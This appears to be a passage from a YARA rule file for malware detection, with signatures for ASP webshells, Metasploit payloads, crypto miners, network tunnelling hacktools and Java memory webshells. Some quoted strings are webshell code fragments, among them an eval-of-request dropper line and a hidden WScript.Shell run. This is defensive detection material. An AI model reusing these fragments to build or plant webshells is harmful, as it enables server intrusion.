      hash15 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash16 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "dim FileSize,FileStart" fullword ascii
      $s2 = "Dim T1" fullword ascii
      $s3 = "Class LBF" fullword ascii
      $s4 = "Class UPC" fullword ascii
      $s5 = "Class FIF" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_2014_4_0__1__UnKnown_Vip__1__UnKnown_Vip__201_485 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 2014.asp, 4.0 (1).asp, UnKnown Vip (1).asp, UnKnown Vip.asp, .asp, 2013.asp, _2012.asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash5 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash6 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash7 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash8 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash9 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash10 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash11 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash12 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/goldsun/upadmin/s3\", True, \"\", \"\"" fullword ascii
      $s2 = "a.send loginuser & loginpass & mt & deldomain & quit" fullword ascii
      $s3 = "<td bgcolor='#FFFFFF' align=left>\"&ObT(i,2)&\"</td></tr>\"" fullword ascii
      $s4 = "SI=SI&\"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>\"&ObT(i,0)&\"</td><td bgcolor='#FFFFFF'>\"&ObT(i,1)&\"" ascii
      $s5 = "SI=SI&\"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>\"&ObT(i,0)&\"</td><td bgcolor='#FFFFFF'>\"&ObT(i,1)&\"" ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _Ajan_ajn_486 {
   meta:
      description = "webshell - from files Ajan.asp, ajn.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dcc843550c34495f4c7b90c6e6bdf2a537e8837b17c4ebe802067c5fee6f715a"
      hash2 = "9339bd6cf23b8883fd5adc5f2813145689f0b4e081d355a91e52ffc75209238c"
   strings:
      $s1 = "WshShell.Run \"c:\\net.vbs\", 0, false" fullword ascii
      $s2 = " </SCRIPT>" fullword ascii
      $s3 = "Dim WshShell" fullword ascii
      $s4 = "<SCRIPT LANGUAGE=\"VBScript\">" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "Set WshShell = CreateObject(\"WScript.Shell\")" fullword ascii /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x533c and filesize < 3KB and ( all of them )
      ) or ( all of them )
}

rule _NEW_WebShell__1__UnKnown_Vip__1__UnKnown_Vip_NEW_WebShell__1___2014_10_23_14_54_16__NEW_WebShe_487 {
   meta:
      description = "webshell - from files NEW WebShell (1).asp, UnKnown Vip (1).asp, UnKnown Vip.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, NEW WebShell.asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash2 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash3 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash4 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash5 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash6 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash7 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash8 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "For Each item In files" fullword ascii
      $s2 = "For Each item In folders" fullword ascii
      $s3 = "fsoTreeForMdb item.Path, rs, stream" fullword ascii
      $s4 = "addToMdb(thePath)" fullword ascii
      $s5 = "unPack(thePath)" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _NEW_WebShell__1__NEW_WebShell__1___2014_10_23_14_54_16__NEW_WebShell___1__488 {
   meta:
      description = "webshell - from files NEW WebShell (1).asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, NEW WebShell.asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash2 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash3 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash4 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash5 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "fso.CreateTextFile(server.mappath(\"test.aspx\")).Write\"\"&chr(60)&\"%@ Page Language=\"\"Jscript\"\" validateRequest=\"\"false" ascii
      $s2 = "fso.CreateTextFile(server.mappath(\"test.aspx\")).Write\"\"&chr(60)&\"%@ Page Language=\"\"Jscript\"\" validateRequest=\"\"false" ascii
      $s3 = "BackUrl=\"<br><br><center><a href='javascript:history.back()'>" fullword ascii
      $s4 = ")&\"\"&chr(62)&\"\"&chr(60)&\"\"&chr(37)&\"Response.Write(eval(Request.Item[\"\"w\"\"],\"\"unsafe\"\"));\"&chr(37)&\"\"&chr(62)&" ascii
      $s5 = "ShiSanNewStr = vbCrLf & ShiSanNewStr" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _404_1d_489 {
   meta:
      description = "webshell - from files 404.asp, 1d.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e4d3d57f4de0497d24095cbd83d5500268323e247e4de2e69cd704975b134678"
      hash2 = "5a1a2900ec634bb1651fff9d542491221449754289ad5a58791ee3104ccef752"
   strings:
      $s1 = "0xBNl-CkmDb2Y=?tKAoW^N" fullword ascii
      $s2 = "x~nXkY,WE" fullword ascii
      $s3 = "@!z1+UY" fullword ascii
      $s4 = "Yn.@*@!4.@*@!4.@*@!8M@*" fullword ascii
      $s5 = "@!mP4D" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _DarkBlade1_5_indexx_r00tsFSO_490 {
   meta:
      description = "webshell - from files DarkBlade1.5.asp, indexx.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1acff7ac75d73a0c7589e0403e5e7be7b4708faf278f76eb45008710a7f9a4c8"
      hash2 = "a828153a8ec75ebeec010bd9e0fa5873b9c2602c0caa393a115075a16d74d0ab"
      hash3 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "conn.ConnectionTimeout=1" fullword ascii
      $s2 = "Set theFolder=Nothing" fullword ascii
      $s3 = "Set files=Nothing" fullword ascii
      $s4 = "FileSize=0" fullword ascii
      $s5 = "Set conn=Nothing" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _DarkBlade1_5__indexx_r00tsFSO_491 {
   meta:
      description = "webshell - from files DarkBlade1.5.asp, .asp, indexx.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1acff7ac75d73a0c7589e0403e5e7be7b4708faf278f76eb45008710a7f9a4c8"
      hash2 = "0ba9d0d668d00ee68a2869c6a1b9c05f08469daa84f177079e76e4baeef7748c"
      hash3 = "a828153a8ec75ebeec010bd9e0fa5873b9c2602c0caa393a115075a16d74d0ab"
      hash4 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "If Err.number=-2147217843 or Err.number=-2147467259 Then" fullword ascii
      $s2 = "If Err Then Err.Clear" fullword ascii
      $s3 = "Set rs=Nothing" fullword ascii
      $s4 = "Private Sub Class_Terminate" fullword ascii
      $s5 = "\"-RatioDown=1\"&vbCrLf&\"-RatiosCredit=0\"&vbCrLf&\"-QuotaCurrent=0\"&vbCrLf&\"-QuotaMaximum=0\"&vbCrLf&_" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _shell_decoded_zehir_492 {
   meta:
      description = "webshell - from files shell_decoded.asp, zehir.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d3bc4102bba36224ad94e0f8a23cc31f8a9278f5fc1797693329204ef0b15e6b"
      hash2 = "c350b163b5527ee445b315ec5a2431e311201616ce8cb2f7d048888ef58da2c4"
   strings:
      $s1 = "Response.BinaryWrite readBinaryFile(Fil.path)" fullword ascii
      $s2 = "Response.Write \"</tr>\"" fullword ascii
      $s3 = "Response.Write \"</td></tr></table>\"" fullword ascii
      $s4 = "Response.Write \"</td>\"" fullword ascii
      $s5 = "For Each f1 In fc" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule Trojan_HackTool_msfi{
   meta:
	descript = "Trojan.HackTool.msfi(exe)"
	author = "licpu"
	info = "msf"
   strings:
      $s1 = "  -U, --uuid <uuid>      set the UUID (base64)"
	  $s2 = "  -u, --uri <uri>        add connection URI"
	  $s3 = "  -b, --background <0|1> start as a background service (0 disable, 1 enable)"
	  $s4 = "  -p, --persist [none|install|uninstall] manage persistence"
	  $s5 = "hu:U:G:d:o:b:p:n:lcm:"
	  $s6 = "/mettle/mettle/src/main.c"
	  $s7 = "/mettle/mettle/src/mettle.c"
	  $s8 = "/mettle/mettle/src/c2_http.c"
	  $s9 = "/mettle/mettle/src/channel.c"
	  $s10 = "/mettle/mettle/src/extensions.c"
	  $s11= "/mettle/mettle/src/network_client.c"
	  $s12= "/mettle/mettle/src/tlv.c"
	  $s13= "/mettle/mettle/src/stdapi/net/config.c"
	  $s14= "/mettle/mettle/src/service.c"
	  $s15= "/mettle/mettle/src/network_server.c"
   condition:
      ( 3 of them )
}

rule Trojan_HackTool_msfaa {
   meta:
	descript = "Trojan.HackTool.msfaa"
	author = "licpu"
	info = "msf"
   strings:
	  $s0 = "ext_server_priv.x64.dll"
      $s1 = "stdapi_railgun_memwrite"
      $s2 = "stdapi_fs_delete_dir"
      $s3 = "stdapi_fs_delete_file"
      $s4 = "stdapi_fs_file_copy"
      $s5 = "stdapi_sys_process_attach"
      $s6 = "stdapi_sys_process_image_load"
      $s7 = "stdapi_sys_process_memory_write"
      $s8 = "stdapi_sys_process_thread_create"
      $s9 = "stdapi_sys_process_thread_set_regs"
      $s10 = "stdapi_sys_config_steal_token"
      $s11 = "stdapi_ui_enable_keyboard"
      $s12 = "stdapi_ui_desktop_screenshot"
      $s13 = "stdapi_sys_process_get_processes"
      $s14 = "stdapi_sys_config_sysinfo"
      $s15 = "stdapi_sys_process_kill"
      $s16 = "stdapi_sys_process_execute"
      
   condition:
      ( 4 of them )
}

rule Worm_miner_a{
	meta:
		descript = "Worm.Miner.a"
		author = "licpu"
		info = ""
	strings:
		$s0 = "Usage: xmrig" nocase
		$s1 = "stratum+tcp://"
		$s2 = "stratum+ssl://"
		$s3 = "xmr.pool"
		$s4 = "stratum+tcp://" wide
		$s5 = "stratum+ssl://" wide
		$s6 = "XMR-Stak-Miner" nocase
		$s7 = "XMRSTAK_VERSION" nocase
		$s9 = "xmrigMiner" nocase
		$s10 = "cpuminer" nocase
		$s11 = "Usage: xmrig-proxy" nocase
		
	condition:
		2 of them
}

rule Worm_miner_b{
	meta:
		descript = "Worm.Miner.b"
		author = "licpu"
		info = ""
	strings:
		$s0 = "mining.submit"
		$s1 = "mining.subscribe"
		$s2 = "mining.authorize"
		$s3 = "mining.extranonce.subscribe"
		$s4 = "mining.set_difficulty"
		$s5 = "stratum+ssl://"
		$s6 = "mining.set_extranonce"
		$s7 = "mining.notify"
		$s8 = "mining.set_target"
		$s9 = "mining.submit" wide
		$s10 = "mining.subscribe" wide
		$s11 = "mining.authorize" wide
		$s12 = "mining.extranonce.subscribe" wide
		$s13 = "mining.set_difficulty" wide
		$s14 = "stratum+ssl://" wide
		$s15 = "mining.set_extranonce" wide
		$s16 = "mining.notify" wide
		$s17 = "mining.set_target" wide
		
	condition:
		2 of them
}

rule HackTool_earthworm_a{
 meta:
  descript = "HackTool.netAgentEarthworm.a"
  author = "licpu"
 strings:
  $s0 = "lcx_listen --listenPort "
  $s1 = "lcx_slave -d [ref_ip] -e "
  $s2 = "lcx_tran --listenport "
  $s3 = "Earthworm is a network agent tool."
  $s4 = "http://rootkiter.com/EarthWrom/"
  $s5 = "rcsocks 0.0.0.0:%d <--[%4d usec]--> 0.0.0.0:%d"
  $s6 = "lcx_tran 0.0.0.0:%d <--[%4d usec]--> %s:%d"
  $s7 = "lcx_slave %s:%d <--[%4d usec]--> %s:%d"
  
 condition:
  2 of them
}

rule HackTool_fpipe_a{
 meta:
  descript = "HackTool.netAgentFpipe.a"
  author = "licpu"
 strings:
  $s0 = "FPipe v2.1 - TCP/UDP port redirector."
  $s1 = "%s [-hvu?] [-lrs <port>] [-i IP] IP"
  $s2 = "-c    - maximum allowed simultaneous TCP connections. Default is %d"
  $s3 = "fpipe -l 53 -s 53 -r 80 192.168.1.101"
  $s4 = "Data sent to and from the connected machines will be passed through."
  $s5 = "Pipe connected:\x0a   In: %16s:%-5d --> %s:%d\x0a  Out: %16s:%-5d --> %s:%d"
 condition:
  2 of them
}

rule HackTool_fport_a{
 meta:
  descript = "HackTool.netAgentFport.a"
  author = "licpu"
 strings:
  $s0 = "You must have administrator privileges to run fport - exiting"
  $s1 = "FPort v2.0 - TCP/IP Process to Port Mapper"
 condition:
  any of them
}

rule HackTool_frp_a{
 meta:
  descript = "HackTool.netAgentFrp.a"
  author = "licpu"
 strings:
  $s0 = "/home/wcl/go_projects/src/github.com/fatedier/frp/"
  $s1 = "github.com/fatedier/frp/cmd/frpc/"
  $s2 = "github.com/fatedier/frp/client/proxy"
  $s3 = "github.com/fatedier/frp/models/"
  $s4 = "github.com/fatedier/frp/utils/"
  $s5 = "github.com/fatedier/frp/vendor/github.com/"
 condition:
  2 of them
}

rule HackTool_htran_a{
 meta:
  descript = "HackTool.netAgentHtran.a"
  author = "licpu"
 strings:
  $s0 = "=========== Code by lion & bkbll, Welcome to http://www.cnhonker.com =========="
  $s1 = "%s -<listen|tran|slave> <option> [-log logfile]"
  $s2 = "-listen <ConnectPort> <TransmitPort>"
  $s3 = "-tran   <ConnectPort> <TransmitHost> <TransmitPort>"
  $s4 = "-slave <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>"
  $s5 = "[+] Start Transmit (%s:%d <-> %s:%d)"
 condition:
  2 of them
}

rule HackTool_Lcx_a{
 meta:
  descript = "HackTool.netAgentClx.a"
  author = "licpu"
 strings:
  $s0 = "xlc v1.0 -Port Transport by"
  $s1 = "usage: xlc.exe [options]"
  $s2 = "-slave  remoteIp remotePort1  localIp  localPort"
  $s3 = "-listen  remotePort1 remotePort2"
  $s4 = "[+] Connect OK!    \n[+] xlcTeam congratulations!"
 
 condition:
  2 of them
}

rule HackTool_Lcx_b{
 meta:
  descript = "HackTool.netAgentClx.b"
  author = "licpu"
 strings:
  $s0 = "ok,I closed the two fd"
  $s1 = "\x0d\x0a########### read from %s:%d ####################\x0d\x0a"
  $s2 = "\x0d\x0a########### reply from %s:%d ####################\x0d\x0a"
  $s3 = "accept a client on port %d from %s,waiting another on port %d...."
  $s4 = "Socket data transport tool"
  $s5 = "Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename]"
  $s6 = "1: listen on PORT1 and connect to HOST2:PORT2"
  $s7 = "2: listen on PORT1 and PORT2"
  $s8 = "3: connect to HOST1:PORT1 and HOST2:PORT2"
  $s9 = "Socket data transport tool.\x0d\x0aVersion:%s"
  $s11 = "[+] Start Transmit (%s:%d <-> %s:%d) ......"
  $s12 = "lcx mod by Tristone,version :%s"
 condition:
  2 of them
}

rule HackTool_Lcx_c{
 meta:
  descript = "HackTool.netAgentClx.c"
  author = "licpu"
 strings:
  $s0 = "\n[+]  Send <Total %d>: %d.%d.%d.%d:%d -> %d.%d.%d.%d:%d,  %d Bytes\n"
  $s1 = "\n[+]  Connection <Total %d> Cutdown, Total : %d Bytes\n\n"
  $s2 = "\n[+]  Connect %s Successed,Transfering...\n"
  $s3 = "\n[+]  Connect %s Successed,Start Transfer...\n"
  $s4 = "\nUsage of Packet Transmit:\n"
  $s5 = "  %s -<listen|tran|slave> <option> [<-log|-hex|-text> file] \n"
  $s6 = "  -tran   <local port>   <remote host>  <remote port>\n"
  $s7 = "  -slave  <remote host1> <remote port1> <remote host2> <remote port2>\n\n"
 condition:
  2 of them
}

rule HackTool_Lcx_d{
 meta:
  descript = "HackTool.netAgentClx.d"
  author = "licpu"
 strings:
  $s0 = " Welcome to use NATBypass "
  $s1 = "https://github.com/cw1997/NATBypass"
  $s2 = "usage: \"-listen port1 port2\""
  $s3 = "-tran port1 ip:port2\""
  $s4 = "-slave ip1:port1 ip2:port2\""
  $s5 = "-tran need two arguments"
  $s6 = "-listen need two arguments"
 condition:
  2 of them
}

rule HackTool_proxychain_a{
 meta:
  descript = "HackTool.netAgentProxychain.a"
  author = "licpu"
 strings:
  $s0 = "PROXYCHAINS_CONF_FILE"
  $s1 = "PROXYCHAINS_QUIET_MODE"
  $s2 = "/etc/proxychains.conf"
  $s3 = "proxychains_got_chain_data"
 condition:
  2 of them
}

rule HackTool_ssocks_a{
 meta:
  descript = "HackTool.netAgentSsocks.a"
  author = "licpu"
 strings:
  $s0 = "--socks rcsocksserv:1080"
  $s1 = "rsSocks Reverse Socks5 Server"
  $s2 = "rcSocks Reverse Client Socks5"
  $s3 = "socks5 server rcsocksserv:1088"
  $s4 = "reverse socks5 server, you set the socks arg (host:port)"
  $s5 = "--port {port} the socks5 port you want"
  $s6 = "sSocks Socks5 Server Relay"
  $s7 = "%s --socks socksserv.com:1080"
  $s8 = "%s --socks localhost:1080 --listen 1088"
  $s9 = "%s --socks localhost:1080 mywebserv.com 80"
  $s10 = "%s -s localhost:1080 -u y0ug -p 1234 mywebserv.com 80"
  $s11 = "nsocks v%s ( Netcat like with Socks5 support )"
  $s12 = "ssockd - Server Socks5 v%s"
  $s13 = "%s -p 8080 -a ssocksd.auth -d"
  $s14 = "--file {file}  see man 5 ssocksd.conf"
  $s15 = "--auth {file}  see man 5 ssocksd.auth"
 condition:
  2 of them
}

rule HackTool_sockscap64_a{
 meta:
  descript = "HackTool.netAgentSockscap64.a"
  author = "licpu"
 strings:
  $s0 = "SocksCap64 is resolving proxy domain for you, the may take several seconds."
  $s1 = "All Programs installed on your computer has been added to SocksCap64."
  $s2 = "https://plus.google.com/+Sockscap64bit"
  $s3 = "SocksCap64 (1.0/;p)"
  $s4 = "Logged in. SocksCap64 is refreshing proxy..."
 condition:
  2 of them
}

rule HackTool_NetAgentNgrok_a{
	meta:
		descript = "HackTool.NetAgentngrok.a"
		author = "licpu"
	strings:
		$s0 = "go_ngrok_com_lib_"
		$s1 = "*cli.ngrokService"
		$s2 = "go.ngrok.com"
		$s3 = "*client.proxyConn"
		$s4 = ".ngrok.com:443"
		$s5 = "$HOME/.ngrok2/ngrok.yml"
	condition:
		2 of them
}

rule HackTool_NetAgentAgent_a{
	meta:
		descript = "HackTool.NetAgentAgent.a"
		author = "licpu"
	strings:
		$s0 = "agent.Proxyhttp"
		$s1 = "sshtunnel"
		$s2 = "Stowaway"
		$s3 = "agent.AdminOffline"
		$s4 = "admin.SendSSHTunnel"
	condition:
		2 of them
}

rule HackTool_NetAgentTgcd_a{
	meta:
		descript = "HackTool.NetAgenttgc.a"
		author = "licpu"
	strings:
		$s0 = "TGCD_Control_Connection"
		$s1 = "Closing control connection to LL"
		$s2 = "revinetd.sourceforge.net"
		$s3 = "Two ports, port1 (-l and --client-port)"
		$s4 = "revinetd -s -c HOST1:PORT1 -l HOST2:PORT2"
	condition:
		2 of them
}

rule HackTool_FirewallTunnel_a{
	meta:
		descript = "HackTool.FirewallTunnel.a"
		author = "licpu"
	strings:
		$s0 = "Firewall Tunnel BackEnd"
		$s1 = "usage: ft_be <-f fe_host> [-p fe_port] [-i interface]"
		$s2 = "ft_get_first_sock"
	condition:
		2 of them
}

rule HackTool_NetAgentVenom_a{
	meta:
		descript = "HackTool.NetAgentVenom.a"
		author = "licpu"
	strings:
		$s0 = "github.com/Dliv3/Venom"
		$s1 = "./venom_agent -lport [port]"
	condition:
		any of them
}

rule HackTool_NetAgentDnscat_a{
	meta:
		descript = "HackTool.NetAgentDnscat.a"
		author = "licpu"
	strings:
		$s0 = "dnscat.c"
		$s1 = "dnscat --dns=server=1.2.3.4,port=53"
		$s2 = "dnscat2"
		$s3 = "dnscat mydomain.com"
	condition:
		2 of them
}

rule HackTool_NetAgentIodine_a{
	meta:
		descript = "HackTool.NetAgentIodine.a"
		author = "licpu"
	strings:
		$s0 = "IODINED_PASS"
		$s1 = "t iodined -DD"
		$s2 = "-d device to set tunnel device name"
		$s3 = "-m mtu to set tunnel device mtu"
		$s4 = "IODINE_PASS"
		$s5 = "iodine IP over DNS tunneling client"
		$s6 = "iodine [options]"
	condition:
		2 of them
}

rule HackTool_NetAgentIox_a{
	meta:
		descript = "HackTool.NetAgentIox.a"
		author = "licpu"
	strings:
		$s0 = "iox/crypto/chacha20"
		$s1 = "iox/crypto.Cipher"
		$s2 = "iox/socks5."
	condition:
		2 of them
}

rule HackTool_netAgentNpc_a{
	meta:
		descript = "HackTool.NetAgentNpc.a"
		author = "licpu"
	strings:
		$s0 = "/github.com/cnlh/nps/"
		$s1 = "NPC_SERVER_ADDR"
		$s2 = "NPC_SERVER_VKEY"
		$s3 = "npc_vkey.txt"
	condition:
		2 of them
}

rule HackTool_NetAgentS5_a{
	meta:
		descript = "HackTool.NetAgentS5.a"
		author = "licpu"
	strings:
		$s0 = "s5.go/s5.go"
		$s1 = "proxy listen address"
		$s2 = "UDP ASSOCIATE"
	condition:
		2 of them
}

rule HackTool_Scan_fscan{
	meta:
		descript = "HackTool.Scan.fscan"
		author = "licpu"
	strings:
		$s0 = "github.com/shadow1ng/fscan/WebScan.WebScan"
		$s1 = "Plugins.Expoilt"
		$s2 = "Plugins.PortScan"
	condition:
		all of them
}

rule Hacktool_Netagent_PortTunnel{
meta:
	description = "Hacktool.Netagent.PortTunnel.a"
	author = "licpu"
strings:
	$s1 = "PortTunnel Server stats"
	$s2 = "blocked by PortTunnel"
	$s3 = "PortTunnel Stats.csv"

condition:
	2 of them
}

rule behinder{
	meta:
		description = "behinder evil class byte detect"
	strings:
		$classname1 = "TomcatShell" ascii fullword

		$x1 = "Cipher" ascii fullword
		$x2 = "AES" ascii fullword
		$x3 = "SecretKeySpec" ascii fullword
		$x4 = "ClassLoader" ascii fullword
		$x5 = "defineClass" ascii fullword
		$x6 = "BASE64Decoder" ascii fullword
		$x7 = "getReader" ascii fullword
		$x8 = "equals" ascii fullword

	condition:
		$classname1 or 8 of ($x*)
}

rule godzilla{
	meta:
		description = "godzilla evil class byte detect"

	strings:
		$classname1 = "AES_BASE64" ascii fullword
		$classname2 = "AES_RAW" ascii fullword
		$classname3 = "Behinder" ascii fullword 
		$classname4 = "Cknife" ascii fullword 
		$classname5 = "Meterpreter" ascii fullword 
		$classname6 = "ReGeorg" ascii fullword 

		$Servlet1 = "createWrapper" ascii fullword
		$Servlet2 = "org.apache.catalina.Container" ascii fullword
		$Servlet3 = "findChild" ascii fullword
		$Servlet4 = "addServletMappingDecoded" ascii fullword
		$Servlet5 = "addServletMapping" ascii fullword
		$Servlet6 = "org.apache.catalina.connector.MapperListener" ascii fullword
		$Servlet7 = "org.apache.catalina.core.ContainerBase" ascii fullword
		$Servlet8 = "addWrapper" ascii fullword
		$Servlet9 = "setServlet" ascii fullword

		$nolog1 = "getCondition" ascii fullword
		$nolog2 = "setCondition" ascii fullword
		$nolog3 = "org.apache.catalina.Valve" ascii fullword
		$nolog4 = "FuckLog" ascii fullword

	condition:
		1 of ($classname*) or 6 of ($Servlet*) or all of ($nolog*)
}

rule filter{
	meta:
		description = "add evil filter class byte detect"

	strings:
		$auth1 = "n1ntyfilter" ascii fullword
		$auth2 = "threedr3am" ascii fullword

		$context1 = "Filter" ascii fullword
		$context2 = "FilterDef" ascii fullword
		$context3 = "setFilterName" ascii fullword
		$context4 = "setFilterClass" ascii fullword
		$context5 = "filterConfigs" ascii fullword
		$context6 = "setAccessible" ascii fullword

		$filter1 = "doFilter"  ascii fullword
		$filter2 = "Filter" ascii fullword

		$exec1 = /(ba|z|da|tc|c|k|)sh/ ascii fullword
		$exec2 = /(cmd|powershell)/ ascii fullword
		$exec3 = /(ProcessBuilder|(getRuntime&exec))/ ascii fullword


	condition:
		1 of ($auth*) or (5 of ($context*) and 3 of ($exec*)) or (2 of ($filter*) and 3 of ($exec*))

}

rule listener{
    meta:
        description = "add evil listener class byte detect"

    strings:
        $context1 = "getServletContext" ascii fullword
        $context2 = "getDeclaredField" ascii fullword
        $context3 = "setAccessible" ascii fullword
        $context4 = "ApplicationContext" ascii fullword
        $context5 = "StandardContext" ascii fullword
        $context6 = "addApplicationEventListener" ascii fullword

        $listener1 = "ServletRequestListener" ascii fullword
        $listener2 = "requestInitialized" ascii fullword
        $listener3 = "requestDestroyed" ascii fullword

        $exec1 = /\b(ba|z|da|tc|c|k|\b)sh\b/ ascii fullword
        $exec2 = /(cmd|powershell)/ ascii fullword
        $exec3 = /(ProcessBuilder|(getRuntime&exec))/ ascii fullword

    condition:
            (6 of ($context*) and 1 of ($exec*)) or (3 of ($listener*) and 1 of ($exec*))
}

rule hideshell {
	meta:
		description = "hide jsp class byte detect"

	strings:
		$hidefunc1 = "makeWrapperUri" ascii fullword
		$hidefunc2 = "accessingSelf" ascii fullword
		$hidefunc3 = "includeHiddenShell" ascii fullword
		$hidefunc4 = "getHideShellWrapper" ascii fullword
		$hidefunc5 = "hideWrapper" ascii fullword
		$hidefunc6 = "makeHiddenName" ascii fullword
		$hidefunc7 = "nolog" ascii fullword

		$keystr1 = "?action=attach&wrapperName=" ascii fullword
		$keystr2 = "?action=hide&wrapperName=" ascii fullword
		$keystr3 = "?action=delete&wrapperName=" ascii fullword

	condition:
		7 of ($hidefunc*) and 3 of ($keystr*)

}

rule valve{
	meta:
		description = "valve jsp class byte detect"

	strings:
		$context1 = "Pipeline"  ascii fullword
		$context2 = "getPipeline" ascii fullword
		$context3 = "addValve" ascii fullword

		$valve1 = "ValveBase" ascii fullword
		$valve2 = "invoke" ascii fullword

		$exec1 = /\b(ba|z|da|tc|c|k|\b)sh\b/ ascii fullword
		$exec2 = /(cmd|powershell)/ ascii fullword
		$exec3 = /(ProcessBuilder|(getRuntime&exec))/ ascii fullword

	condition:
		(3 of ($context*) and 1 of ($exec*)) or (2 of ($valve*) and 1 of ($exec*))
}

rule sample_filter1{
	meta:
		description = "catched filter sample detect"

	strings:
		$constant1 = "CharacterEncodingFilter" ascii fullword
		$constant2 = "org.apache.catalina.core.StandardContext" ascii fullword
		$constant3 = "org.apache.tomcat.util.descriptor.web.FilterMap" ascii fullword
		$constant4 = "org.apache.catalina.deploy.FilterMap" ascii fullword
		$constant5 = "findFilterMaps" ascii fullword
		$constant6 = "defineClass" ascii fullword
		$constant7 = "org.apache.coyote.RequestGroupInfo" ascii fullword
		$constant8 = "Accept-Languages" ascii fullword
		$constant9 = "CharacterEncodingFilter" ascii fullword
		$constant10 = "filterStart" ascii fullword

		$method1 = "getServletContext" ascii fullword

		$exec1 = "decodeBuffer" ascii fullword
		$exec2 = "BASE64Decoder" ascii fullword
		$exec3 = "currentThread" ascii fullword
